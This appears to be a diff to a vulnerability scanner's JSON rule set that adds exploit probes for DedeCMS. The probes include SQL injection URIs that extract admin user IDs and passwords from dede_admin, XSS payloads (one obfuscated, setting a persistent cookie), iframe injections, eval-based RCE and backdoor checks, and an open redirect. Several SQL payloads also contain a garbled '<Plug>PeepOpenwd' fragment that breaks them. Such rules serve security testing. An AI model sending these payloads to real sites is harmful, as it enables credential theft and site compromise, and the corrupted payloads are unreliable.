@@ -328,15 +328,83 @@
         },
         {
             "enable":false,
-            "id":1000010,
+            "id":1000011,
             "type":"CMS/Dede/SQLInject",
-            "msg":"DedCMS advancedsearch.php SqlInject,in /plus/advancedsearch.php",
+            "msg":"DedCMS feedback_js.php SqlInject",
             "isAnd":true,
             "isBin":false,
             "proto":"http",
             "method":"GET",
             "uriFilePath":"",
-            "uris":["/plus/advancedsearch.php?mid=1&sql=SELECT%20*%20FROM%20%60%23@__admin"],
+            "uris":["/plus/feedback_js.php?arcurl=%27%20union%20select%20%20and%201=2%20union%20select%201,1,1,userid,3,1,3,3%3CPlug%3EPeepOpenwd,1,1,3,1,1,1,1,1%20from%20dede_admin%20where%201=1%20union%20select%20*%20from%20dede_feedback%20where%201=2%20and%20=%20from%20dede_admin%20where%20%27%27=%27"],
+            "isUpload":false,
+            "mime":"",
+            "isText":false,
+            "postArgs":"",
+            "postArgsFilePath":"",
+            "headers":[{"name":"User-Agent","value":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36"}],
+            "matches":[
+                {
+                    "target":"status",
+                    "op":"contains",
+                    "preOP":"",
+                    "isBin":false,
+                    "value":"200"
+                },
+                {
+                    "target":"text",
+                    "op":"contains",
+                    "preOP":"",
+                    "isBin":false,
+                    "value":"4beed3b9c4a886067de0e3a094246f78"
+                }
+            ]
+        },
+        {
+            "enable":false,
+            "id":1000012,
+            "type":"CMS/Dede/XSS",
+            "msg":"DedCMS getpage XSS",
+            "isAnd":true,
+            "isBin":false,
+            "proto":"http",
+            "method":"GET",
+            "uriFilePath":"",
+            "uris":["/dede/login.php?gotopage=%22%3E%3Cscript%3Eeval(String.fromCharCode(80,101,114,115,105,115,116,101,110,99,101,95,100,97,116,97,61,39,34,62,60,115,99,114,105,112,116,62,97,108,101,114,116,40,47,120,115,115,32,114,111,111,116,107,105,116,33,47,41,60,47,115,99,114,105,112,116,62,60,120,61,34,39,59,32,13,10,118,97,114,32,100,97,116,101,61,110,101,119,32,68,97,116,101,40,41,59,13,10,118,97,114,32,101,120,112,105,114,101,68,97,121,115,61,51,54,53,59,32,13,10,100,97,116,101,46,115,101,116,84,105,109,101,40,100,97,116,101,46,103,101,116,84,105,109,101,40,41,43,101,120,112,105,114,101,68,97,121,115,42,50,52,42,51,54,48,48,42,49,48,48,48,41,59,13,10,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,61,39,103,111,116,111,112,97,103,101,61,39,43,80,101,114,115,105,115,116,101,110,99,101,95,100,97,116,97,43,39,59,101,120,112,105,114,101,115,61,39,43,100,97,116,101,46,116,111,71,77,84,83,116,114,105,110,103,40,41,59,13,10,97,108,101,114,116,40,39,88,115,115,32,82,111,111,116,107,105,116,32,73,110,115,116,97,108,108,32,83,117,99,99,101,115,115,102,117,108,32,33,33,33,33,39,41,59))%3C/script%3E%3Cx=%22%22"],
+            "isUpload":false,
+            "mime":"",
+            "isText":false,
+            "postArgs":"",
+            "postArgsFilePath":"",
+            "headers":[{"name":"User-Agent","value":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36"}],
+            "matches":[
+                {
+                    "target":"status",
+                    "op":"contains",
+                    "preOP":"",
+                    "isBin":false,
+                    "value":"200"
+                },
+                {
+                    "target":"text",
+                    "op":"contains",
+                    "preOP":"",
+                    "isBin":false,
+                    "value":">eval"
+                }
+            ]
+        },
+        {
+            "enable":false,
+            "id":1000013,
+            "type":"CMS/Dede/SQLInject",
+            "msg":"DedCMS infosearch.php SqlInject,in /plus/infosearch.php",
+            "isAnd":true,
+            "isBin":false,
+            "proto":"http",
+            "method":"GET",
+            "uriFilePath":"",
+            "uris":["/plus/infosearch.php?action=search&q=%CF%27%20union%20select%201,2,userid,4%3CPlug%3EPeepOpenwd,6%20from%20dede_admin/*"],
             "isUpload":false,
             "mime":"",
             "isText":false,
@@ -357,6 +425,354 @@
                     "preOP":"",
                     "isBin":false,
                     "value":"admin"
+                }
+            ]
+        },
+
+        {
+            "enable":false,
+            "id":1000014,
+            "type":"CMS/Dede/XSS",
+            "msg":"DedCMS jump.php XSS",
+            "isAnd":true,
+            "isBin":false,
+            "proto":"http",
+            "method":"GET",
+            "uriFilePath":"",
+            "uris":["/include/jump.php?gurl=%23%22%3C/script%3E%3Cscript%3Ealert(/00day.cn/)%3C/script%3E/*"],
+            "isUpload":false,
+            "mime":"",
+            "isText":false,
+            "postArgs":"",
+            "postArgsFilePath":"",
+            "headers":[{"name":"User-Agent","value":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36"}],
+            "matches":[
+                {
+                    "target":"status",
+                    "op":"contains",
+                    "preOP":"",
+                    "isBin":false,
+                    "value":"200"
+                },
+                {
+                    "target":"text",
+                    "op":"contains",
+                    "preOP":"",
+                    "isBin":false,
+                    "value":"<script>alert(/00day.cn/)</script>"
+                }
+            ]
+        },
+        {
+            "enable":false,
+            "id":1000015,
+            "type":"CMS/Dede/XSS",
+            "msg":"DedCMS login.php XSS",
+            "isAnd":true,
+            "isBin":false,
+            "proto":"http",
+            "method":"GET",
+            "uriFilePath":"",
+            "uris":["/member/login.php?gourl=%23%22%3C/script%3E%3Cscript%3Ealert(/00day.cn/)%3C/script%3E/*"],
+            "isUpload":false,
+            "mime":"",
+            "isText":false,
+            "postArgs":"",
+            "postArgsFilePath":"",
+            "headers":[{"name":"User-Agent","value":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36"}],
+            "matches":[
+                {
+                    "target":"status",
+                    "op":"contains",
+                    "preOP":"",
+                    "isBin":false,
+                    "value":"200"
+                },
+                {
+                    "target":"text",
+                    "op":"contains",
+                    "preOP":"",
+                    "isBin":false,
+                    "value":"<script>alert(/00day.cn/)</script>"
+                }
+            ]
+        },
+        {
+            "enable":false,
+            "id":1000016,
+            "type":"CMS/Dede/SQLInject",
+            "msg":"DedCMS recommend.php SQLInject",
+            "isAnd":true,
+            "isBin":false,
+            "proto":"http",
+            "method":"GET",
+            "uriFilePath":"",
+            "uris":["/plus/recommend.php?aid=1&_FILES%5Btype%5D%5Bname%5D&_FILES%5Btype%5D%5Bsize%5D&_FILES%5Btype%5D%5Btype%5D&_FILES%5Btype%5D%5Btmp_name%5D=aa%5C%27AnD+ChAr(@%60%27%60)+/*!50000Union*/+/*!50000SeLect*/+1,2,3,md5(1234),5,6,7,8,9%20FrOm%20%60%23@__admin%60%23"],
+            "isUpload":false,
+            "mime":"",
+            "isText":false,
+            "postArgs":"",
+            "postArgsFilePath":"",
+            "headers":[{"name":"User-Agent","value":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36"}],
+            "matches":[
+                {
+                    "target":"text",
+                    "op":"contains",
+                    "preOP":"",
+                    "isBin":false,
+                    "value":"81dc9bdb52d04dc20036dbd8313ed055"
+                }
+            ]
+        },
+        {
+            "enable":false,
+            "id":1000017,
+            "type":"CMS/Dede/Redirect",
+            "msg":"DedCMS Redirect download.php in download",
+            "isAnd":true,
+            "isBin":false,
+            "proto":"http",
+            "method":"GET",
+            "uriFilePath":"",
+            "uris":["/plus/download.php?open=1&link=aHR0cHM6Ly93d3cuYmFpZHUuY29t"],
+            "isUpload":false,
+            "mime":"",
+            "isText":false,
+            "postArgs":"",
+            "postArgsFilePath":"",
+            "headers":[{"name":"User-Agent","value":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36"}],
+            "matches":[
+                {
+                    "target":"text",
+                    "op":"contains",
+                    "preOP":"",
+                    "isBin":false,
+                    "value":"www.baidu.com"
+                }
+            ]
+        },
+        {
+            "enable":false,
+            "id":1000018,
+            "type":"CMS/Dede/SQLInject",
+            "msg":"DedCMS reg_new.php has SQLInject",
+            "isAnd":true,
+            "isBin":false,
+            "proto":"http",
+            "method":"GET",
+            "uriFilePath":"",
+            "uris":["/member/reg_new.php?dopost=regbase&step=1&mtype=%B8%F6%C8%CB&mtype=%B8%F6%C8%CB&userid=123asd123&uname=12asd13123&userpwd=123123&userpwdok=123123&email=1213asd123%40QQ.COM&safequestion=1','1111111111111','1389701121','127.0.0.1','1389701121','127.0.0.1'),('%E4%B8%AA%E4%BA%BA',user(),'4297f44b13955235245b2497399d7a93','12as11111111111111111d13123','','10','0','1213asd11111111111123@QQ.COM','100',%20'0','-10','','1&safeanswer=1111111111111&sex=&vdcode=slum&agree=')"],
+            "isUpload":false,
+            "mime":"",
+            "isText":false,
+            "postArgs":"",
+            "postArgsFilePath":"",
+            "headers":[{"name":"User-Agent","value":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36"}],
+            "matches":[
+                {
+                    "target":"text",
+                    "op":"contains",
+                    "preOP":"",
+                    "isBin":false,
+                    "value":"1213asd11111111111123@QQ.COM"
+                }
+            ]
+        },
+        {
+            "enable":false,
+            "id":1000019,
+            "type":"CMS/Dede/SQLInject",
+            "msg":"DedCMS search.php has SQLInject",
+            "isAnd":true,
+            "isBin":false,
+            "proto":"http",
+            "method":"GET",
+            "uriFilePath":"",
+            "uris":["/plus/search.php?keyword=test&typeArr%5B%20uNion%20%5D=a"],
+            "isUpload":false,
+            "mime":"",
+            "isText":false,
+            "postArgs":"",
+            "postArgsFilePath":"",
+            "headers":[{"name":"User-Agent","value":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36"}],
+            "matches":[
+                {
+                    "target":"text",
+                    "op":"contains",
+                    "preOP":"",
+                    "isBin":false,
+                    "value":"Error infos"
+                },
+                {
+                    "target":"text",
+                    "op":"contains",
+                    "preOP":"",
+                    "isBin":false,
+                    "value":"Error sql"
+                }
+            ]
+        },
+
+        {
+            "enable":false,
+            "id":1000020,
+            "type":"CMS/Dede/BackDoor",
+            "msg":"DedCMS backdoor in /member/story_add_content_action.php",
+            "isAnd":true,
+            "isBin":false,
+            "proto":"http",
+            "method":"GET",
+            "uriFilePath":"",
+            "uris":["/member/story_add_content_action.php?body=eval(phpinfo(););&chapterid=1"],
+            "isUpload":false,
+            "mime":"",
+            "isText":false,
+            "postArgs":"",
+            "postArgsFilePath":"",
+            "headers":[{"name":"User-Agent","value":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36"}],
+            "matches":[
+                {
+                    "target":"text",
+                    "op":"contains",
+                    "preOP":"",
+                    "isBin":false,
+                    "value":"phpinfo"
+                }
+            ]
+        },
+        {
+            "enable":false,
+            "id":1000021,
+            "type":"CMS/Dede/RCE",
+            "msg":"DedCMS RCE in /plus/digg_frame.php",
+            "isAnd":true,
+            "isBin":false,
+            "proto":"http",
+            "method":"GET",
+            "uriFilePath":"",
+            "uris":["/plus/digg_frame.php?action=good&id=1024e1024&mid=*/eval(phpinfo(););var_dump(3);?%3E"],
+            "isUpload":false,
+            "mime":"",
+            "isText":false,
+            "postArgs":"",
+            "postArgsFilePath":"",
+            "headers":[{"name":"User-Agent","value":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36"}],
+            "matches":[
+                {
+                    "target":"status",
+                    "op":"contains",
+                    "preOP":"",
+                    "isBin":false,
+                    "value":"200"
+                },
+                {
+                    "target":"text",
+                    "op":"contains",
+                    "preOP":"",
+                    "isBin":false,
+                    "value":"phpinfo"
+                }
+            ]
+        },
+        {
+            "enable":false,
+            "id":1000022,
+            "type":"CMS/Dede/XSS",
+            "msg":"DedCMS XSS in /plus/list.php",
+            "isAnd":true,
+            "isBin":false,
+            "proto":"http",
+            "method":"GET",
+            "uriFilePath":"",
+            "uris":["/plus/list.php?tid=6&TotalResult=%3Ciframe%20src=http://www.gohack.org%3E&nativeplace=0&infotype=0&keyword=&orderby=hot&PageNo=2"],
+            "isUpload":false,
+            "mime":"",
+            "isText":false,
+            "postArgs":"",
+            "postArgsFilePath":"",
+            "headers":[{"name":"User-Agent","value":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36"}],
+            "matches":[
+                {
+                    "target":"status",
+                    "op":"contains",
+                    "preOP":"",
+                    "isBin":false,
+                    "value":"200"
+                },
+                {
+                    "target":"text",
+                    "op":"contains",
+                    "preOP":"",
+                    "isBin":false,
+                    "value":"<iframe src=http://www.gohack.org>"
+                }
+            ]
+        },
+        {
+            "enable":false,
+            "id":1000023,
+            "type":"CMS/Dede/XSS",
+            "msg":"DedCMS XSS in /member/login.php",
+            "isAnd":true,
+            "isBin":false,
+            "proto":"http",
+            "method":"GET",
+            "uriFilePath":"",
+            "uris":["/member/login.php?gourl=%3E%3Ciframe%20src=http://www.zhuba.net%3E"],
+            "isUpload":false,
+            "mime":"",
+            "isText":false,
+            "postArgs":"",
+            "postArgsFilePath":"",
+            "headers":[{"name":"User-Agent","value":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36"}],
+            "matches":[
+                {
+                    "target":"status",
+                    "op":"contains",
+                    "preOP":"",
+                    "isBin":false,
+                    "value":"200"
+                },
+                {
+                    "target":"text",
+                    "op":"contains",
+                    "preOP":"",
+                    "isBin":false,
+                    "value":"><iframe src=http://www.zhuba.net>"
+                }
+            ]
+        },
+        {
+            "enable":true,
+            "id":1000024,
+            "type":"CMS/Dede/XSS",
+            "msg":"DedCMS XSS in /include/dialog/config.php",
+            "isAnd":true,
+            "isBin":false,
+            "proto":"http",
+            "method":"GET",
+            "uriFilePath":"",
+            "uris":["/include/dialog/config.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E"],
+            "isUpload":false,
+            "mime":"",
+            "isText":false,
+            "postArgs":"",
+            "postArgsFilePath":"",
+            "headers":[{"name":"User-Agent","value":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36"}],
+            "matches":[
+                {
+                    "target":"status",
+                    "op":"contains",
+                    "preOP":"",
+                    "isBin":false,
+                    "value":"200"
+                },
+                {
+                    "target":"text",
+                    "op":"contains",
+                    "preOP":"",
+                    "isBin":false,
+                    "value":"<script>alert(1);</script>"
                 }
             ]
         }
